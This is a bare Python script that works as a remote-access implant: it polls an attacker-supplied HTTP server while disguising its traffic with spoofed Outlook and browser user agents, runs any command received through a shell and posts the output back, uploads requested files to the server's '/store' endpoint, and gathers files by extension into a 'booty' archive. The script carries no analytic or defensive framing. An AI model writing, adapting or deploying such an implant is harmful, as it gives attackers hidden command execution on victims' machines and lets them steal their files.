import requests
import os
import sys
import subprocess
import time
import tarfile
from random import choice

try:
    soc = sys.argv[1]
except:
    print("Valid socket address needed. Quitting.")
    sys.exit()

user_agents = ['Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
                'Microsoft Office/15.0 (Windows NT 6.1; Microsoft Outlook 15.0.4631; Pro)',
                'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C; Microsoft Outlook 15.0.4763; ms-office; MSOffice 15)',
                'Mozilla/4.0 (compatible; ms-office; MSOffice 16)',
                'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)',
                'msnbot-media/1.0 (+http://search.msn.com/msnbot.htm)']

httpsrv = ('http://'+soc)
    
print("Connecting to ", httpsrv)
headers = {'User-Agent': choice(user_agents)}

def search_files(extension):
    booty = []
    for root, dirs, files, in os.walk("c:\\tools\\Terminal-master\\"):
        for file in files:
            if file.endswith("."+extension):
                booty.append(os.path.join(root, file))
    f_count = len(booty)
    post_response = requests.post(url=httpsrv, headers=headers, data=('[+] All files enumerated. Count: ' + str(f_count)).encode())
    return booty


def make_tarfile(files):
    with tarfile.open(('booty.tar'), "w:gz") as tar:
        for filename in files:
            tar.add(filename)
    post_response = requests.post(url=httpsrv, headers=headers, data='[+] Archive created.'.encode())


while True:
    req = requests.get(httpsrv, headers=headers)
    command = req.text
    if 'terminate' in command:
        break
    elif 'archive' in command:
        archive, ext = command.split("*")
        make_tarfile(search_files(ext))
    elif 'grab' in command:
        grab, path = command.split("*")
        if os.path.exists(path):
            url = httpsrv + '/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files, headers=headers)
        else:
            post_response = requests.post(url=httpsrv, headers=headers, data='[-] Not able to find the file!'.encode())
    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url=httpsrv, headers=headers, data=CMD.stdout.read())
        post_response = requests.post(url=httpsrv, headers=headers, data=CMD.stderr.read())
    time.sleep(3)

